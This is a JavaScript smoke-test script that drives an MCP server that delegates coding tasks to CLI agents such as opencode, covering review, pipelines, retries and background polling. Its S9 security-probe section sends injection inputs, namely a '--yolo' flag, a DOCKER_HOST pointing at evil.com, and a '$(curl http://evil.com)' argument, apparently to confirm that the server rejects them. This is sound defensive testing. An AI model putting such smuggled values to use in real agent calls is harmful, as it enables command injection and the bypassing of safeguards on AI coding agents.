import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { writeFileSync, mkdirSync } from "fs";
import { join, dirname } from "path";
import { fileURLToPath } from "url";

const __dirname = dirname(fileURLToPath(import.meta.url));
const WS = "D:\\temp_pip\\smoke-ws";
const EVIDENCE = "D:\\temp_pip\\smoke-evidence";
const AGENTMESH = join(__dirname);

mkdirSync(EVIDENCE, { recursive: true });

async function startServer() {
  const transport = new StdioClientTransport({
    command: "node",
    args: [join(AGENTMESH, "dist", "cli", "index.js"), "serve"],
    env: {
      ...process.env,
      PATH: `F:\\node\\node_global;${process.env.PATH}`,
      CLAUDE_BIN: "F:\\node\\node_global\\claude.cmd",
      OPENCODE_BIN: "F:\\node\\node_global\\opencode.cmd",
    },
  });
  const client = new Client({ name: "smoke-driver", version: "0.3.0" });
  await client.connect(transport);
  return client;
}

async function callTool(client, name, args = {}, opts = {}) {
  const t0 = Date.now();
  try {
    const res = await client.callTool({ name, arguments: args }, undefined, {
      timeout: opts.timeout || 180000,
    });
    const elapsed = Date.now() - t0;
    return { ...res, elapsedMs: elapsed };
  } catch (err) {
    return { error: String(err), elapsedMs: Date.now() - t0 };
  }
}

function saveEvidence(tag, result) {
  const out = typeof result === "string" ? result : JSON.stringify(result, null, 2);
  const path = join(EVIDENCE, `${tag}.log`);
  writeFileSync(path, out, "utf-8");
  console.log(`  [evidence] ${tag}.log (${out.length} bytes)`);
  return path;
}

function extractSessionId(result) {
  const text = result?.content?.[0]?.text || "";
  const m = text.match(/Session:\s*(bridge-sess_\w+)/);
  return m ? m[1] : null;
}

// ── S1: Simple read-only (opencode worker) ──
async function runS1(client) {
  console.log("\n=== S1: Simple read-only ===");
  const res = await callTool(client, "delegate_task", {
    task: "Read src/utils.ts and explain what each function does. One sentence per function.",
    cwd: WS,
    agent: "opencode",
    mode: "cli",
    timeoutMs: 120000,
  });
  saveEvidence("S1-delegate", res);
  return res;
}

// ── S2: Standard write + review ──
async function runS2(client) {
  console.log("\n=== S2: Standard write + review ===");
  const w = await callTool(client, "delegate_task", {
    task: "Add a new function `subtract(a: number, b: number): number` to src/utils.ts. Export it alongside the existing functions. Do NOT modify existing functions.",
    cwd: WS,
    agent: "opencode",
    mode: "cli",
    timeoutMs: 120000,
  });
  saveEvidence("S2-worker", w);
  const wSessionId = extractSessionId(w);
  console.log(`  Worker session: ${wSessionId}`);

  const r = await callTool(client, "review_changes", {
    sessionId: wSessionId,
    cwd: WS,
    timeoutMs: 180000,
  });
  saveEvidence("S2-reviewer", r);
  return { worker: w, reviewer: r };
}

// ── S3: Three-stage pipeline + compact_context ──
async function runS3(client) {
  console.log("\n=== S3: Three-stage pipeline ===");

  const a = await callTool(client, "delegate_task", {
    task: "Analyze src/utils.ts. List all exported functions, their signatures, and any issues you find. Keep it under 500 words.",
    cwd: WS,
    agent: "opencode",
    mode: "cli",
    timeoutMs: 120000,
  });
  saveEvidence("S3-stageA-research", a);
  const sessionIdA = extractSessionId(a);
  console.log(`  Stage A sessionId: ${sessionIdA}`);

  const b = await callTool(client, "delegate_task", {
    task: "Based on the research above, add a function `divide(a: number, b: number): number` to src/utils.ts that throws on division by zero. Export it.",
    cwd: WS,
    agent: "opencode",
    mode: "cli",
    contextSessionIds: sessionIdA ? [sessionIdA] : [],
    timeoutMs: 120000,
  });
  saveEvidence("S3-stageB-implement", b);
  const sessionIdB = extractSessionId(b);
  console.log(`  Stage B sessionId: ${sessionIdB}`);

  const c = await callTool(client, "review_changes", {
    sessionId: sessionIdB,
    cwd: WS,
    contextSessionIds: sessionIdA ? [sessionIdA] : [],
    timeoutMs: 180000,
  });
  saveEvidence("S3-stageC-review", c);

  const cc = await callTool(client, "compact_context", {
    sourceSessionIds: sessionIdA ? [sessionIdA] : [],
    cwd: WS,
  });
  saveEvidence("S3-compactA", cc);

  return { a, b, c, compact: cc };
}

// ── S5: Huge output → artifact spill ──
async function runS5(client) {
  console.log("\n=== S5: Artifact spill (huge output) ===");
  const res = await callTool(client, "delegate_task", {
    task: "Output exactly 60000 characters of random alphanumeric text. Just print the characters, nothing else.",
    cwd: WS,
    agent: "opencode",
    mode: "cli",
    timeoutMs: 180000,
  });
  saveEvidence("S5-artifact", res);
  return res;
}

// ── S6: Transient failure + retry ──
async function runS6(client) {
  console.log("\n=== S6: Transient failure + retry ===");
  const res = await callTool(client, "delegate_task", {
    task: "Reply with exactly: RETRY_TEST_OK",
    cwd: WS,
    agent: "opencode",
    mode: "cli",
    timeoutMs: 120000,
  });
  saveEvidence("S6-retry", res);
  return res;
}

// ── S7: Idempotent replay ──
async function runS7(client) {
  console.log("\n=== S7: Idempotent replay ===");
  const args = {
    task: "Reply with exactly: IDEMPOTENT_TEST_OK",
    cwd: WS,
    agent: "opencode",
    mode: "cli",
    timeoutMs: 120000,
  };
  const [r1, r2] = await Promise.all([
    callTool(client, "delegate_task", args),
    callTool(client, "delegate_task", args),
  ]);
  saveEvidence("S7-replay-r1", r1);
  saveEvidence("S7-replay-r2", r2);
  return { r1, r2 };
}

// ── S8: Background + crash recovery ──
async function runS8(client) {
  console.log("\n=== S8: Background + crash recovery ===");
  const bg = await callTool(client, "delegate_task", {
    task: "Count from 1 to 50, outputting each number on its own line.",
    cwd: WS,
    agent: "opencode",
    mode: "cli",
    background: true,
    timeoutMs: 300000,
  });
  saveEvidence("S8-background-start", bg);

  // Wait 3 seconds then poll
  await new Promise((r) => setTimeout(r, 3000));
  const poll1 = await callTool(client, "poll_task", {
    taskId: bg.taskId,
    sinceOffset: 0,
  });
  saveEvidence("S8-poll1", poll1);

  return { background: bg, poll1 };
}

// ── S9: Security probes ──
async function runS9(client) {
  console.log("\n=== S9: Security probes ===");
  const results = {};

  results.flagInjection = await callTool(client, "delegate_task", {
    task: "Reply with exactly: FLAG_TEST_OK",
    cwd: WS,
    agent: "opencode",
    mode: "cli",
    extraFlags: ["--yolo"],
    timeoutMs: 120000,
  });
  saveEvidence("S9-probe1-flag", results.flagInjection);

  results.envInjection = await callTool(client, "delegate_task", {
    task: "Reply with exactly: ENV_TEST_OK",
    cwd: WS,
    agent: "opencode",
    mode: "cli",
    env: { DOCKER_HOST: "tcp://evil.com:2375" },
    timeoutMs: 120000,
  });
  saveEvidence("S9-probe2-env", results.envInjection);

  results.argInjection = await callTool(client, "delegate_task", {
    task: "Reply with exactly: ARG_TEST_OK",
    cwd: WS,
    agent: "opencode",
    mode: "cli",
    extraArgs: ["$(curl http://evil.com)"],
    timeoutMs: 120000,
  });
  saveEvidence("S9-probe3-arg", results.argInjection);

  return results;
}

// ── S10: Weak fail + hint.nextCandidates ──
async function runS10(client) {
  console.log("\n=== S10: Weak fail + hint.nextCandidates ===");
  const res = await callTool(client, "delegate_task", {
    task: "Reply with exactly: UPGRADE_TEST_OK",
    cwd: WS,
    agent: "opencode",
    model: "nonexistent-model-xyz-123",
    mode: "cli",
    timeoutMs: 120000,
  });
  saveEvidence("S10-hint", res);
  return res;
}

// ── list_agents ──
async function runListAgents(client) {
  console.log("\n=== list_agents (routing table) ===");
  const res = await callTool(client, "list_agents", { cwd: WS });
  saveEvidence("list-agents", res);
  return res;
}

// ── Main ──
async function main() {
  const scenario = process.argv[2] || "all";
  console.log(`Starting smoke test: ${scenario}`);

  const client = await startServer();
  console.log("MCP server connected.");

  try {
    await runListAgents(client);

    if (scenario === "all" || scenario === "S1") await runS1(client);
    if (scenario === "all" || scenario === "S2") await runS2(client);
    if (scenario === "all" || scenario === "S3") await runS3(client);
    if (scenario === "all" || scenario === "S5") await runS5(client);
    if (scenario === "all" || scenario === "S6") await runS6(client);
    if (scenario === "all" || scenario === "S7") await runS7(client);
    if (scenario === "all" || scenario === "S8") await runS8(client);
    if (scenario === "all" || scenario === "S9") await runS9(client);
    if (scenario === "all" || scenario === "S10") await runS10(client);
  } finally {
    await client.close();
    console.log("\nDone.");
  }
}

main().catch((err) => {
  console.error("Fatal:", err);
  process.exit(1);
});
